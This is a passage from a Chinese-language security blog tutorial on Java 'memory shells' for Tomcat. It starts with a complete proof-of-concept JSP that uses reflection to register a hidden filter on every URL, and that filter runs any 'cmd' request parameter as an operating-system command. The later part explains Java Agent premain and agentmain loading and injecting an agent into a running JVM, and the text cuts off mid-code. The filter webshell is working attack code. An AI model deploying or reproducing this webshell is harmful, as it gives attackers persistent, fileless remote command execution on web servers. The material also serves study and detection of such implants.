class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br><span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>filterDef.setFilter(filter);<br>filterDef.setFilterName(name);<br>filterDef.setFilterClass(filter.getClass().getName());<br>standardContext.addFilterDef(filterDef);<br></code></pre></td></tr></table></figure><h4 id="创建filterMap"><a href="#创建filterMap" class="headerlink" title="创建filterMap"></a>创建filterMap</h4><p>filterMap用于filter和路径的绑定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>filterMap.setFilterName(name);<br>filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>standardContext.addFilterMapBefore(filterMap);<br></code></pre></td></tr></table></figure><h4 id="封装filterConfig及filterDef到filterConfigs"><a href="#封装filterConfig及filterDef到filterConfigs" class="headerlink" title="封装filterConfig及filterDef到filterConfigs"></a>封装filterConfig及filterDef到filterConfigs</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br>    <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>filterConfigs.put(name, filterConfig);<br></code></pre></td></tr></table></figure><h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br> <br>&lt;%<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br> <br>&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Filter</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    standardContext.addFilterDef(filterDef);<br> <br> <br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    standardContext.addFilterMapBefore(filterMap);<br> <br> <br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br> <br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br></code></pre></td></tr></table></figure><p>同样能够执行命令</p><h2 id="JavaAgent内存马"><a href="#JavaAgent内存马" class="headerlink" title="JavaAgent内存马"></a>JavaAgent内存马</h2><p>注意，编写javaagent的时候必须要有一个premain，不然一定会报错</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231024182537523.png" alt="image-20231024182537523"> </p><p>在这里构建，构建的时候主类不需要选择，并勾选包含在项目构建中</p><h3 id="什么是Java-Agent？"><a href="#什么是Java-Agent？" class="headerlink" title="什么是Java Agent？"></a>什么是Java Agent？</h3><p>我们知道Java是一种静态强类型语言，在运行之前必须将其编译成<code>.class</code>字节码，然后再交给JVM处理运行。Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p><p>实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎样实现的呢？</p><p>对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的<code>premain-Agent</code>，另一种是JVM启动之后加载的<code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/premainAgent.jpg" alt="img"></p><p>premain-Agent</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/agentmain.jpg" alt="img"></p><p>agentmain-Agent</p><h3 id="Java-Agent示例"><a href="#Java-Agent示例" class="headerlink" title="Java Agent示例"></a>Java Agent示例</h3><h4 id="premain-Agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h4><p>我们首先来实现一个简单的<code>premain-Agent</code>，创建一个Maven项目，编写一个简单的premain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.premain.agent;<br> <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Java_Agent_premain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了premain-Agent！&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着在<code>resource/META-INF/</code>下创建<code>MANIFEST.MF</code>清单文件用以指定<code>premain-Agent</code>的启动类</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Manifest-Version: <span class="hljs-number">1.0</span><br>Premain-Class: com<span class="hljs-selector-class">.java</span><span class="hljs-selector-class">.premain</span><span class="hljs-selector-class">.agent</span><span class="hljs-selector-class">.Java_Agent_premain</span><br> <br></code></pre></td></tr></table></figure><p>将其打包成jar文件</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/%25E5%259B%25BE%25E7%2589%2587-73.png" alt="img"></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-74.png" alt="img"></p><p>创建一个目标类</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>添加JVM Options（注意冒号之后不能有空格）</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-javaagent:<span class="hljs-string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span><br><br> <br> <br> <br></code></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302135924345.png" alt="image-20240302135924345"> </p><h4 id="agentmain-Agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h4><p>相较于premain-Agent只能在JVM启动前加载，agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和JVM有关的两个类。</p><h5 id="VirtualMachine类"><a href="#VirtualMachine类" class="headerlink" title="VirtualMachine类"></a>VirtualMachine类</h5><p><code>com.sun.tools.attach.VirtualMachine</code>类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VirtualMachine</span>.</span></span>attach<span class="hljs-literal">()</span><br> <br><span class="hljs-comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VirtualMachine</span>.</span></span>load<span class="hljs-constructor">Agent()</span><br> <br><span class="hljs-comment">//获得当前所有的JVM列表</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VirtualMachine</span>.</span></span><span class="hljs-built_in">list</span><span class="hljs-literal">()</span><br> <br><span class="hljs-comment">//解除与特定JVM的连接</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VirtualMachine</span>.</span></span>detach<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h5 id="VirtualMachineDescriptor类"><a href="#VirtualMachineDescriptor类" class="headerlink" title="VirtualMachineDescriptor类"></a>VirtualMachineDescriptor类</h5><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br> <br><span class="hljs-keyword">import</span> java.util.List;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">get_PID</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>&#123;<br>        <br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.<span class="hljs-built_in">list</span>();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br>            <br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID</span><br>            <span class="hljs-keyword">if</span>(vmd.<span class="hljs-built_in">displayName</span>().<span class="hljs-built_in">equals</span>(<span class="hljs-string">&quot;get_PID&quot;</span>))<br>            System.out.<span class="hljs-built_in">println</span>(vmd.<span class="hljs-built_in">id</span>());<br>        &#125;<br> <br>    &#125;<br>&#125;<br> <br> <br>##<br><span class="hljs-number">4908</span><br> <br><span class="hljs-built_in">Process</span> finished with exit code <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>下面我们就来实现一个<code>agentmain-Agent</code>。首先我们编写一个Sleep_Hello类，模拟正在运行的JVM</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">import</span> <span class="hljs-type">static</span> java.lang.Thread.sleep;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sleep_Hello</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws InterruptedException </span>&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            <span class="hljs-built_in">sleep</span>(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编写我们的agentmain-Agent类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.agentmain.agent;<br> <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br> <br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Java_Agent_agentmain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同时配置MANIFEST.MF文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Manifest-Version: <span class="hljs-number">1.0</span><br>Agent-Class: com<span class="hljs-selector-class">.java</span><span class="hljs-selector-class">.agentmain</span><span class="hljs-selector-class">.agent</span><span class="hljs-selector-class">.Java_Agent_agentmain</span><br> <br></code></pre></td></tr></table></figure><p>编译打包成jar文件<code>out/artifacts/Java_Agent_jar/Java_Agent.jar</code></p><p>最后编写一个<code>Inject_Agent</code>类，获取特定JVM的PID并注入Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.inject;<br> <br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br> <br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject_Agent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br> <br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;Sleep_Hello&quot;</span>))&#123;<br> <br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br> <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先启动<code>Sleep_Hello</code>目标JVM</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302135943249.png" alt="image-20240302135943249"></p><p>然后运行<code>Inject_Agent</code>类，注入Agent</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302135950371.png" alt="image-20240302135950371"></p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302140004215.png" alt="image-20240302140004215"> </p><p>其在Java中是一个接口，常用方法如下</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Instrumentation</span> </span>&#123;<br>    <br>    <span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-keyword">boolean</span> canRetransform)</span></span>;<br> <br>    <span class="hljs-comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span></span>;<br> <br>    <span class="hljs-comment">//删除一个类转换器</span><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span></span>;<br> <br> <br>    <span class="hljs-comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException</span>;<br> <br> <br> <br>    <span class="hljs-comment">//判断一个类是否被修改</span><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span></span>;<br> <br>    <span class="hljs-comment">// 获取目标已经加载的类。</span><br>    <span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">&quot;rawtypes&quot;</span>)<br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//获取一个对象的大小</span><br>    <span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span></span>;<br> <br>&#125;<br></code></pre></td></tr></table></figure><h5 id="获取目标JVM已加载类"><a href="#获取目标JVM已加载类" class="headerlink" title="获取目标JVM已加载类"></a>获取目标JVM已加载类</h5><p>下面我们简单实现一个能够获取目标JVM已加载类的<code>agentmain-Agent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.agentmain.instrumentation;<br> <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br> <br><span class="hljs-keyword">public</span> <span 